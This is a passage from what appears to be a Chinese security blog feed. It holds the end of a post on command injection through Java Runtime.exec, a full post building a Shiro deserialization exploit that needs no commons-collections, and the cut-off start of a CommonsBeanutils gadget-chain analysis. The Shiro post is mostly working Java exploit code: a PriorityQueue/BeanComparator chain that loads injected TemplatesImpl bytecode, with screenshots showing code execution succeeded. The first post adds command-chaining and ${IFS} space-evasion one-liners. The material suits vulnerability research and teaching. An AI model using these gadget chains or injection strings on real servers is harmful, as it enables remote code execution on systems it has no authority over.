<p>第二种是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] command = &#123; &quot;/bin/bash&quot;,&quot;-c&quot;,&quot;ping -c 1 8.8.8.8&amp;&amp;ls&quot; &#125;;</span><br></pre></td></tr></table></figure></p>
<p>都能顺利的执行多命令，可以看到都是以 <code>bash</code> 或者 <code>sh</code> 作为执行程序，真正要执行的命令作为参数，同时因为 <code>bash</code> 也提供了一个 <code>shell</code> 的上下文环境，所以连接命令的特殊字符也能得到正确解析。</p>
<p>其中字符串和字符串数组的区别在于，当传入字符串时，会通过 <code>StringTokenizer</code> 帮你分割成字符串数组，而字符串数组则无需这步。所以当使用字符串时，由于 <code>StringTokenizer</code> 的分割会导致一些非预期的情况，命令执行无法成功.</p>
<p>而我们也知道 <code>StringTokenizer</code> 主要根据 <code>\t\n\r\f</code> 来分割的，简单的说，只要不出现多余的空格，其实是和字符串数组的处理是一样的，第一种方法就是这种思路。<br>所以按照 <code>linux</code> 操作系统特性规避空格即可。类似的还有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String command = &quot;/bin/bash -c ping$&#123;IFS&#125;-c$&#123;IFS&#125;1$&#123;IFS&#125;8.8.8.8&amp;&amp;ls&quot;;</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c $@ | sh . echo</span><br></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>无论是字符串还是字符串数组，都不能直接传入多命令，需要把真正的命令作为 <code>/bin/bash</code> 的参数。</li>
<li>传入字符串和传入字符串数组的区别在于字符串经过了 <code>StringTokenizer</code> 的处理，而字符串数组则跳过了这个分割数组的部分。</li>
<li><p>类似于下面代码，不存在命令注入：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = <span class="string">"可控"</span>;</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://xz.aliyun.com/t/7046" target="_blank" rel="noopener">Java Runtime.getRuntime().exec由表及里</a></li>
<li><a href="https://www.anquanke.com/post/id/159554" target="_blank" rel="noopener">奇淫技巧之突破Runtime.exec限制获取shell 命令执行环境</a></li>
<li><a href="https://mp.weixin.qq.com/s/pzpc44-xH932M4eCJ8LxYg" target="_blank" rel="noopener">在 Runtime.getRuntime().exec(String cmd) 中执行任意shell命令的几种方法</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Java代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 姿势 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[无依赖的Shiro反序列化利用]]></title>
      <url>//blog/1620443190405.html</url>
      <content type="html"><![CDATA[<p>无依赖的Shiro反序列化利用<br><a id="more"></a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>因为有了之前 <code>CommonsBeanutils</code> 的基础，直接复用其 payload,发现在只有 shiro,没有其他依赖的环境下会报错，<code>CommonsBeanutils</code> 代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Object templates = createTemplatesImpl();</span><br><span class="line">        <span class="comment">// mock method name until armed</span></span><br><span class="line">        <span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"lowestSetBit"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">        queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// switch method called by comparator</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        setFieldValue(queue, <span class="string">"queue"</span>, <span class="keyword">new</span> Object[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        tools.Deserialize(queue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Boolean.parseBoolean(System.getProperty(<span class="string">"properXalan"</span>, <span class="string">"false"</span>)) ? createTemplatesImpl( Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TransformerFactoryImpl"</span>)) : createTemplatesImpl(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span><span class="params">(Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        T templates = tplClass.newInstance();</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(CommonsBeanutilsEXP.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1620443297940.png" alt="image"></p>
<p>在 <code>org.apache.commons.beanutils.BeanComparator.&lt;init&gt;</code> 报错 <code>Caused by: java.lang.ClassNotFoundException: org.apache.commons.collections.comparators.ComparableComparator</code>,这个类是在 <code>commons-collections</code> 里的，所以当没有使用到 <code>commons-collections</code> 时，<code>CommonsBeanutils</code> 就无法使用了。<br>在看报错信息，跟进 <code>org.apache.commons.beanutils.BeanComparator。&lt;init&gt;</code>，发现是构造方法的问题，在 payload 中只传入一个字符串，使用的是默认的 <code>Comparator</code>，这个 <code>Comparator</code> 就是 <code>org.apache.commons.collections.comparators.ComparableComparator</code>，所以才会爆上述的错误：<br><img src="http://x-f1v3.github.io/images/1620443315168.png" alt="image"></p>
<p>解决方法当然是不用默认的 <code>Comparator</code>，查看代码发现 <code>BeanComparator</code> 有 3 个构造方法，其中无参的构造方法最后还是调用了默认的 <code>Comparator</code>，所以只能尝试有 2 个参数的构造方法，指定调用的 <code>Comparator</code>。<br>那么现在的问题就是如何找这个指定 <code>Comparator</code>，其满足 2 个条件即可：</p>
<ul>
<li>实现 <code>java.util.Comparator</code> 接口</li>
<li>实现 <code>java.io.Serializable</code> 接口 </li>
</ul>
<p>先看到实现了 <code>java.util.Comparator</code> 接口的类，还挺多的：<br><img src="http://x-f1v3.github.io/images/1620443324813.png" alt="image"></p>
<p>直接写代码过滤<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileVisitOption;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetInfoFromClass</span><span class="params">(Class clazz)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(Serializable.class.isAssignableFrom(clazz)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!(Comparator.class.isAssignableFrom(clazz)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(clazz.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">EnumerateClassFromJar</span><span class="params">(String JarFile)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            URLClassLoader ucl = URLClassLoader.newInstance(<span class="keyword">new</span> URL[]</span><br><span class="line">                    &#123;</span><br><span class="line">                            (<span class="keyword">new</span> File(JarFile).toURI().toURL())</span><br><span class="line">                    &#125;);</span><br><span class="line">            JarInputStream jis = <span class="keyword">new</span> JarInputStream(<span class="keyword">new</span> FileInputStream(JarFile), <span class="keyword">false</span>);</span><br><span class="line">            JarEntry je;</span><br><span class="line">            String EntryName;</span><br><span class="line">            String ClassName;</span><br><span class="line">            Class clazz;</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                je = jis.getNextJarEntry();</span><br><span class="line">                <span class="keyword">if</span>(je == <span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                EntryName = je.getName();</span><br><span class="line">                <span class="keyword">if</span>(EntryName.endsWith(<span class="string">".class"</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    ClassName = EntryName.substring(<span class="number">0</span>, EntryName.length() - <span class="number">6</span>).replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        clazz = ucl.loadClass(ClassName);</span><br><span class="line">                        GetInfoFromClass(clazz);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span>(Throwable t)</span><br><span class="line">                    &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">EnumerateFileFromDir</span><span class="params">(String dir, String suffix)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(Stream &lt; Path &gt; paths = Files.walk(Paths.get(dir), FileVisitOption.FOLLOW_LINKS))</span><br><span class="line">        &#123;</span><br><span class="line">            paths</span><br><span class="line">                    .filter( Files::isRegularFile )</span><br><span class="line">                    .map( p -&gt; p.toString() )</span><br><span class="line">                    .filter( name -&gt; name.endsWith( suffix ) )</span><br><span class="line">                    .peek( System.out::println )</span><br><span class="line">                    .forEach( FindClass::EnumerateClassFromJar );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Throwable t)</span><br><span class="line">        &#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        String dir = <span class="string">"/Library/Java/JavaVirtualMachines/jdk1.8.0_172.jdk/Contents/Home/jre/lib"</span>;</span><br><span class="line"></span><br><span class="line">        EnumerateFileFromDir(dir, <span class="string">".jar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在 jdk 中查找，最后找到了多个类<br><img src="http://x-f1v3.github.io/images/1620443354810.png" alt="image"></p>
<p>当然最简单的还是 <code>java.lang.String$CaseInsensitiveComparator</code></p>
<p>代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">1</span>];</span><br><span class="line">            ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         System.out.println(ctor.getParameterCount());</span><br><span class="line">            <span class="keyword">return</span> ctor;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Object templates = createTemplatesImpl();</span><br><span class="line">        <span class="comment">// mock method name until armed</span></span><br><span class="line">         Constructor constructor = getFirstCtor(<span class="string">"java.lang.String$CaseInsensitiveComparator"</span>);</span><br><span class="line">         Object obj = constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>,(Comparator) obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">"1"</span>);</span><br><span class="line">        queue.add(<span class="string">"2"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// switch method called by comparator</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">"queue"</span>, <span class="keyword">new</span> Object[]&#123;templates, templates&#125;);</span><br><span class="line">        tools.Deserialize(queue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Boolean.parseBoolean(System.getProperty(<span class="string">"properXalan"</span>, <span class="string">"false"</span>)) ? createTemplatesImpl( Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TransformerFactoryImpl"</span>)) : createTemplatesImpl(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span><span class="params">(Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        T templates = tplClass.newInstance();</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(CommonsBeanutilsEXP.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>成功在极少依赖的情况下执行代码：<br><img src="http://x-f1v3.github.io/images/1620443366521.png" alt="image"></p>
<p>放在 shiro web 环境下执行，成功执行<br><img src="http://x-f1v3.github.io/images/1620443374994.png" alt="image"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank" rel="noopener">CommonsBeanutils与无commons-collections的Shiro反序列化利用</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 漏洞利用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CommonsBeanutils 反序列化]]></title>
      <url>//blog/1620289251280.html</url>
      <content type="html"><![CDATA[<p>CommonsBeanutils 反序列化分析<br><a id="more"></a></p>
<h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commons-beanutils:1.9.2</span><br><span class="line">commons-collections:3.1</span><br><span class="line">commons-logging:1.2</span><br></pre></td></tr></table></figure>
<h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">		PriorityQueue.siftDown()</span><br><span class="line">			siftDownUsingComparator()</span><br><span class="line">				BeanComparator.compare()</span><br><span class="line">					TemplatesImpl.getOutputProperties()</span><br><span class="line">						TemplatesImpl.newTransformer()</span><br><span class="line">							TemplatesImpl.getTransletInstance()</span><br><span class="line">								TemplatesImpl.defineTransletClasses()</span><br><span class="line">						TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">										Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">											Runtime.exec()</span><br></pre></td></tr></table></figure>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>利用链的前半部分还是一样，通过队列中的元素比较，调用某个类的 <code>compare</code> 方法，这次的换成了 <code>org.apache.commons.beanutils.BeanComparator</code> 类：<br><img src="http://x-f1v3.github.io/images/1620289288240.png" alt="image"></p>
<p>可以看到如果 <code>this.property</code> 不为空， 则执行 <code>PropertyUtils.getProperty(o1, this.property);</code>，而 <code>this.property</code>  是通过 <code>BeanComparator</code> 的构造函数传入的，在看 <code>PropertyUtils.getProperty</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289299111.png" alt="image"></p>
<p>这里跳过了很多步骤，简而言之，该方法就是调用传入对象的传入 <code>getter</code> 方法，按照这里的利用链是 <code>TemplatesImpl</code> 的 <code>getOutputProperties</code> 方法，当然，这2个参数都是能控制的，接下来跟进 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289321770.png" alt="image"></p>
<p>这里就执行了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289345167.png" alt="image"></p>
<p>接下来就是 <code>getTransletInstance</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289356639.png" alt="image"></p>
<p>根据字节码重建自定义类：<br><img src="http://x-f1v3.github.io/images/1620289365962.png" alt="image"></p>
<p>这里的流程和 <code>Commonscollections2</code> 反序列化一致，加载自定义类实现任意代码执行；</p>
<p>反序列化的原理已经清楚了，现在就要根据原理构造 POC 了。</p>
<p>首先还是创建一个自定义类，带有 EXP 并继承 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，为啥要继承在 <code>Commonscollections2</code> 里由提到：</p>
